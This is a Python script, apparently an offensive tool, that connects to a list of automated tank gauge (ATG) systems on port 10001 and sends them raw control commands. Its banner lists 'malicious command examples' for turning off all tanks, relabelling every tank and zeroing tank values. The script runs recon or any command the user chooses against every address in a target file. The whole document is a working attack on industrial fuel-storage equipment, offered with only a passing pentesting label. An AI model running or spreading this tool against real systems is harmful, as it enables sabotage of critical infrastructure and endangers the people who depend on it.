import socket, time, threading

print('''ATG Client
       Script written by X3N0V3RS3''')
print('''Command Examples 
         I20100 = Get In Tank Inventory
         I10100 = System Status Report
         I10102 = System Configuration Report
           Malicious Command Examples
         s601000 = Turn off all Tanks
         s60200xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx = Change all Labels to x
         s60400000000000000000 = set all tank values to 0
         (This can be used with proxychains for pentesting purposes)''')

#----------------------------------------------

# Used to run function 201 on a given ATG system.
def default_recon(ip: str, port: int) -> None:
      atg_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atg_socket.connect((ip, port))

      # Passing payload with start of header (CTRL + A) and function 201.
      payload = (b'\x01I20100')
      atg_socket.sendall(payload)

      time.sleep(1)

      response = atg_socket.recv(1024)
      print(ip, response.split())

      atg_socket.close

# Used to run any kind of function.
def execute(ip: str, port: int, message_code: str) -> None:
      atg_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atg_socket.connect((ip, port))

      # Passing payload with start of header (CTRL + A) and user submitted message code.
      payload = ('\x01' + message_code).encode('ascii')
      atg_socket.sendall(payload)

      time.sleep(1)

      response = atg_socket.recv(1024)
      print(ip, response.split())

      atg_socket.close

#---------------------------------------------

atg_list = []
port = 10001 # Usual port for these ATG systems.

# Prompt user for mode, convert to lowercase to ensure that uppercase commands aren't ignored.
while True:
   mode = input("Select mode: ").lower()

   match mode:
       case "":
           mode = "default"
           break
       case "default":
           break
       case "execute":
           # If execute mode is being used, prompt user for the function they want to execute.
           message_code = str(input("Enter function code to send: "))
           break
       case _:
           # If the mode is not one of the listed modes or empty, retry.
           print("Invalid mode. Please type in 'default' or 'execute' as the mode.")
           continue

# Run through text file with IP addresses and store in atglist array.
with open("atglist.txt", 'r') as ip:
  for line in ip:
     for addr in line.split():
           atg_list.append(addr)

# Remotely connect to each IP and run specified commands as stipulated by the mode.
for ip in atg_list:

   if mode == "default":
      bot = threading.Thread(target=default_recon, args=(ip, port))
      time.sleep(1)
      bot.start()
      bot.join()

   if mode == "execute":
      bot = threading.Thread(target=execute, args=(ip, port, message_code))
      time.sleep(1)
      bot.start()
      bot.join()
